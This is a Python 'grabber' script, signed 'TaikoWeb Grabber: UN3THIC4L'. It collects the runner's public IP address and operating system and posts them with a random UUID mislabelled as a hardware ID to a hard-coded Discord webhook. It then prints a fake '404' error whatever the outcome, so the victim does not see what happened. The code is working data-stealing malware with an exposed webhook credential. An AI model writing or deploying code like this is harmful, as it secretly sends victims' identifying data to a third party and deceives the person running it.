import requests
import platform
import uuid


WEBHOOK_URL = 'https://discord.com/api/webhooks/1341902504081883267/DKAC8EDOn9_A7Tj3K5266SFhg2my0QrD7okLFMyy2gAjiyoWIsIAOC7iP9FauzUIL-AG'


def send_to_discord(ip, os, hwid):
    embed = {
        "title": "TaikoWeb Log",
        "description": "@here",
        "color": 16711680,  
        "fields": [
            {
                "name": "IP Address 🌐",
                "value": f"```{ip}```",  
                "inline": True
            },
            {
                "name": "Operating System 💻",
                "value": f"{os} 🖥️",
                "inline": True
            },
            {
                "name": "HWID 🔑",
                "value": f"{hwid} 🔑",
                "inline": True
            }
        ],
        "footer": {
            "text": "TaikoWeb Grabber: UN3THIC4L"
        }
    }

 
    response = requests.post(WEBHOOK_URL, json={"embeds": [embed]})
    return response

def collect_data():
  
    ip_response = requests.get("https://api.ipify.org?format=json")
    ip = ip_response.json().get("ip")

  
    os = platform.system()


    hwid = str(uuid.uuid4())  

    # Send the data to Discord
    discord_response = send_to_discord(ip, os, hwid)

    if discord_response.status_code == 204:
        print("Error 404: Failed HTTPS Request")
    else:
        print("Error 404: Failed HTTPS Request")


collect_data()
